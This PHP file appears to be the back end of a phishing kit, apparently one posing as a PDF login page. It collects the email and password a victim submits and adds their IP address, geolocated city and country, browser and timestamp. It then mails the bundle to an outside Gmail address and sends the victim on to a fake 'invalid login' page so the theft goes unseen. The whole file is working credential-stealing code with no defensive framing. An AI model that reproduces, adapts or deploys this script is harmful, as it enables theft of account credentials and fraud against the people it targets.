<?php
$login = $_POST['login'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "username: ".$_POST['frm-email']."\n";
$message .= "Password: ".$_POST['frm-pass']."\n";
$message .= "============= [ Loc Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = '0-3L0ck SAVAGE';
$subj = "SAVAg3 PDF result | $login";
$from = "From: $domain<west>\n";
mail("	ve.hiring@gmail.com",$subj,$message,$from,$domain);

header("Location: invalidLogin.php");
?>